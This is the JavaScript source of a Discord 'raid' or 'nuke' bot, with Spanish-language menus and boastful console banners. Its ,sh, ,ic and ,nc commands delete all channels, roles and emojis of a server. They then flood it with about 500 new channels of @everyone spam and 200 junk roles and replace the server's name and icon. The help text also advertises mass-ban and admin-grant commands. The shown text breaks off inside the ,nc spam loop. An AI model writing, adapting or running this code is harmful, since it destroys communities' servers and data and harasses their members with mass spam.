const express = require('express');
const bodyParser = require('body-parser');
const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.get('/', function(request, response) {
	response.sendFile(__dirname + '/views/index.html');
});
app.listen(3000, () => console.log(`FUNCIONAMIENTO CORRECTO`));


//----------------------------- SISTEMA 24/7 -----------------------------//


const Discord  = require("discord.js");
const client = new Discord.Client()
const chalk = require('chalk');

client.on("ready", () => {
 
console.log(chalk.yellow(`


░██████╗████████╗░█████╗░██████╗░░██████╗  ██████╗░░░░░░░██████╗░░█████╗░████████╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝  ██╔══██╗░░░░░░██╔══██╗██╔══██╗╚══██╔══╝
╚█████╗░░░░██║░░░███████║██████╔╝╚█████╗░  ██████╔╝█████╗██████╦╝██║░░██║░░░██║░░░
░╚═══██╗░░░██║░░░██╔══██║██╔══██╗░╚═══██╗  ██╔══██╗╚════╝██╔══██╗██║░░██║░░░██║░░░
██████╔╝░░░██║░░░██║░░██║██║░░██║██████╔╝  ██║░░██║░░░░░░██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░
                                                                      `))
 
 
console.log(chalk.red(""));   
console.log(chalk.white(""));   
console.log("                          ");   
  
  console.log(chalk.blue("                               Iniciando bot raid..."));
  console.log("   ")  
  console.log(chalk.red(`Cliente ${client.user.tag} listo para el raid!`));  
  console.log("      ") 
  console.log(chalk.white("Codigo de raid creado por Sh | Para el daño total."));  
  console.log("      ") 
  console.log(chalk.red(`Comandos Para El Raid ,sh | ,ban | ,admin`))
 
console.log("      ")
 
console.log(chalk.blue(`
                                                                      Sh: https://discord.gg/RrsTzauQ73 `))

 presencia();
    });



function presencia(){
  client.user.setPresence({
status: "online",
activity: {
  name: "/help | shieldprotect.xyz",
  type: "WATCHING"
 
}
  });
}

client.on("guildCreate", (guild) => {
const nobots = guild.members.cache.filter(x => !x.user.bot)
if(nobots < 5) guild.leave()
})


//embed premium

const embedt = new Discord.MessageEmbed()
       .setDescription(' > <a:Alerta:885703313247596654> **Este Comando Actualmente Solo Esta Disponibles Para Miembros Premium**\n\n > <a:Sc_Flechita:959342644331438140> **Mas Información Para Requerir Premiun Unete [Aquí](https://discord.gg/RrsTzauQ73)**')
       .setColor('0xe71919');


//help

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === ',rhelp'){
      message.delete()
  const embed = new Discord.MessageEmbed()
          .setTitle(' <a:Splash:895580196151885824> | SH COMANDOS DESTRUCTIVOS | <a:Splash:895580196151885824>')
          .setDescription(' > Todos Los Comandos Explicados Aquí, Prefix: `,` Servidor Del Bot [Click Aquí](https://discord.gg/RrsTzauQ73) \n\n ** > <a:Indicador_Bot:885697958123823144> ,rhelp [Muestra Los Comandos De Nuke]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,sh [Empieza La Diversión]** \n\n ** > <a:Indicador_Bot:885697958123823144> ,admin [Te Otorga Un Rol Con Permisos De Administrador]** \n\n ** > <a:Indicador_Bot:885697958123823144> ,ban [Banea a Todos Los Usuarios Debajo Del Bot]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,cdelete [Borra Todos Lo Canales]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,ccreate [Nukea y Crea 500 Canales Con Pings]** \n\n ** > <a:Indicador_Bot:885697958123823144> ,gname [Cambia El Nombre e Icono Del Servidor]** \n\n ** > <a:Indicador_Bot:885697958123823144> ,rroles [Borra Todos Los Roles Que Esten Debajo Del Bot]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,roles [Crea 200 Roles Que Rellenan El Servidor]**\n\n ** >  <a:Indicador_Bot:885697958123823144> ,remojis [Borra Todos Lo Emojis Del Servidor]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,emojis [Crea Masivamente 49 Emojis Con La Bandera De Sc]**\n\n ** > <a:Indicador_Bot:885697958123823144>  ,msgfuck [Elimina Mensajes En Un Canal]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,info [Muestra La Información Del Servidor]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,lag [Cambia Masivamente El Nombre Del Servidor]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,dios [Spamea Varias Veces Un Canal]**\n\n ** > <a:Indicador_Bot:885697958123823144> ,rsc [Para Ver Los Comandos Premium]** \n\n ** > <a:Indicador_Bot:885697958123823144> ,leave [El Bot Abandona El Servidor]**\n\n ** <a:Alerta:885703313247596654> ¿Quieres usar este bot para tus raids? Escribe ,invite <a:Alerta:885703313247596654> **\n\n ** <a:Fire_Power:885702712723914803> Creado Por 🥀 ☨ Danrxar PS ☨ 🥀#1536 <a:Fire_Power:885702712723914803> **')
          .setColor('0xe0ff00')
          .setThumbnail("https://cdn.discordapp.com/attachments/863657381434621997/991766423397478400/MOSHED-2021-10-30-2-44-55.gif")
          .setImage('https://cdn.discordapp.com/attachments/885695793233797120/906414691218255883/MOSHED-2021-10-28-19-46-56.gif')
          .setFooter("Comando elejido por: " + message.member.displayName, message.author.displayAvatarURL());
  message.channel.send(embed);
                          }
                  });


//Premium

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === ',rsc'){
      message.delete()
 if (!["984913030485790832","982638215120965662"].includes(message.author.id)) return message.channel.send(embedt).then(message => setTimeout(() => message.delete(), 10000));
  const embed6 = new Discord.MessageEmbed()
          .setTitle(' <a:Premium:941243439293534218> | SH DESTRUCTIVE PREMIUM | <a:Premium:941243439293534218>')
          .setDescription(' > Comandos Solo Disponibles Al Boostear Stars Hight o Ser Socio Allí, Prefix: `,` Servidor Del Bot Para Tener Premium [Click Aquí](https://discord.gg/RrsTzauQ73) \n\n ** > <a:Premium:941243439293534218> ,sh2 [Muy Prontp]**\n\n ** > <a:Premium:941243439293534218> ,wbk [Muy Pronto]**\n\n ** > <a:Premium:941243439293534218> ,uban [Muy Pronto]**\n\n ** > <a:Premium:941243439293534218> ,ic [Raid a Nombre De Imperio Cactus]**\n\n ** > <a:Premium:941243439293534218> ,eadmin [Otorga Permisos De Administrador a Everyone]**\n\n ** > <a:Premium:941243439293534218> ,nc [Raid a Nombre De Night Club]**\n\n ** > <a:Premium:941243439293534218> ,md [Muy Pronto]**\n\n ** > <a:Premium:941243439293534218> ,nick [Apodo] [Cambia Los Apodos De Los Miembros Debajo Del Bot]**\n\n ** > <a:Premium:941243439293534218> ,pre [Nombre De Canales y Roles] [Nombre De Spam] [Muy Pronto]**')
          .setColor('0x3ce0dd')
          .setThumbnail("https://cdn.discordapp.com/attachments/863657381434621997/991766423397478400/MOSHED-2021-10-30-2-44-55.gif")
          .setImage('https://cdn.discordapp.com/attachments/885695793233797120/906414691218255883/MOSHED-2021-10-28-19-46-56.gif')
          .setFooter("Comando elejido por: " + message.member.displayName, message.author.displayAvatarURL());
  message.channel.send(embed6);
                          }
                  });


//invite

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === ',invite'){
      message.delete()
  const embed1 = new Discord.MessageEmbed()
          .setColor('RANDOM')
          .setTitle('Invitame')
          .setURL('https://discord.com/api/oauth2/authorize?client_id=870565233800937484&permissions=8&scope=bot')
  message.channel.send(embed1);
                          }
                  });


//automaticosc

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === ',sh'){
      message.delete()
  const embed2 = new Discord.MessageEmbed()
          .setTitle('SERVER FUCKED BY SH')
          .setURL('https://discord.gg/RrsTzauQ73')
          .setDescription('```🌟 THIS SERVER HAS BEEN FUCKED BY STARS CLUB 🌟```')
          .setColor('0xfdf000')
          .addField('**Discord**','https://discord.gg/RrsTzauQ73')
          .addField('**Twitter**','https://twitter.com/PabloSa55497511')
          .addField('**Youtube**','https://www.youtube.com/channel/UCIiG5AW6kOWwLTw5i8MxyoA')
          .setImage('https://cdn.discordapp.com/attachments/885695793233797120/906414691218255883/MOSHED-2021-10-28-19-46-56.gif')
          .setFooter("SERVER DESTRUIDO POR: " + message.member.displayName, message.author.displayAvatarURL());
      message.guild.channels.cache.forEach(channel => channel.delete());
    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`⭐𝚁𝚊𝚒𝚍𝚋𝚢𝚂𝙷⭐`, {
           type: 'text', topic: `https://discord.com/RrsTzauQ73`
         }).then(channel => {
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed2);
           
       })
       }
       message.guild.setName("discord.gg/RrsTzauQ73");
       message.guild.setIcon("https://cdn.discordapp.com/attachments/858535729353457686/906045921245151232/MOSHED-2021-10-30-3-0-11.gif");
       message.guild.roles.cache.map(roles => roles.delete().catch(e => {}));
       message.guild.emojis.cache.map(emoji => emoji.delete());
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `⭐R̷a̷i̷d̷B̷y̷S̷t̷a̷r̷'̷s̷H̷i̷g̷h̷t̷⭐`,color: 'RANDOM',},reason: 'discord.gg/RrsTzauQ73',})
              };
     }
})


//automatico1

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === ',ic'){
      message.delete()
  const embed7 = new Discord.MessageEmbed()
          .setTitle('JODIDOS POR IC GAYS')
          .setURL('https://discord.gg/GGpv58rJvh')
          .setDescription('```🌵 HAN SIDO JODIDOS POR EL IMPERIO CACTUS 🌵```')
          .setColor('0x09ff00')
          .addField('**Discord**','https://discord.gg/GGpv58rJvh')
          .addField('**Twitter**','https://twitter.com/Th3_Wink')
          .addField('**Youtube**','https://youtube.com/channel/UC_RrXeiQ1TdhFXRxMtlMWdg')
          .setImage('https://cdn.discordapp.com/attachments/863657381434621997/1002122779749011496/a_7cb1b88dfe7d00f4b7ca0b090f732119.gif')
          .setFooter("SERVER DESTRUIDO POR: " + message.member.displayName, message.author.displayAvatarURL());
      message.guild.channels.cache.forEach(channel => channel.delete());
    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵`, {
           type: 'text', topic: `https://discord.gg/imperiocactus`
         }).then(channel => {
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
              channel.send(' > ||@everyone|| <a:icflag:931807880011714661> `🌵 F̶u̶c̶k̶e̶d̶ ̶B̶y̶ ̶I̶C̶ 🌵` <a:icflag:931807880011714661> https://discord.gg/GGpv58rJvh', embed7);
           
       })
       }
       message.guild.setName("discord.gg/imperiocactus");
       message.guild.setIcon("https://cdn.discordapp.com/attachments/863657381434621997/1002122779749011496/a_7cb1b88dfe7d00f4b7ca0b090f732119.gif");
       message.guild.roles.cache.map(roles => roles.delete().catch(e => {}));
       message.guild.emojis.cache.map(emoji => emoji.delete());
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `🌵 IcOnTop 🌵`,color: '09ff00',},reason: 'discord.gg/imperiocactus',})
              };
     }
})


//automatico

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === ',nc'){
      message.delete()
 if (!["984913030485790832","974618012055371826","982638215120965662"].includes(message.author.id)) return message.channel.send(embedt).then(message => setTimeout(() => message.delete(), 10000));
  const embed8 = new Discord.MessageEmbed()
          .setTitle('ATACKED BY NIGHT CLUB')
          .setURL('https://discord.gg/yk5vXnfVNp')
          .setDescription('```🌙 THIS SERVER HAS BEEN FUCKED BY DARK NIGHT 🌙```')
          .setColor('0xffffff')
          .addField('**Discord**','https://discord.gg/yk5vXnfVNp')
          .addField('*Twitter**','https://twitter.com/LauryPlantar')
          .addField('**Youtube**','https://youtube.com/channel/UCbkn32i2WwfgK61TqNHtUYA')
          .setImage('https://media.discordapp.net/attachments/978091455195271198/992580401161846785/MOSHED-2022-7-1-8-7-16.gif')
          .setFooter("SERVER DESTRUIDO POR: " + message.member.displayName, message.author.displayAvatarURL());
      message.guild.channels.cache.forEach(channel => channel.delete());
    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`☢ʀᴀɪᴅ-ʙʏ-ɴᴄ☢`, {
           type: 'text', topic: `https://discord.gg/nightclub2022`
         }).then(channel => {
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
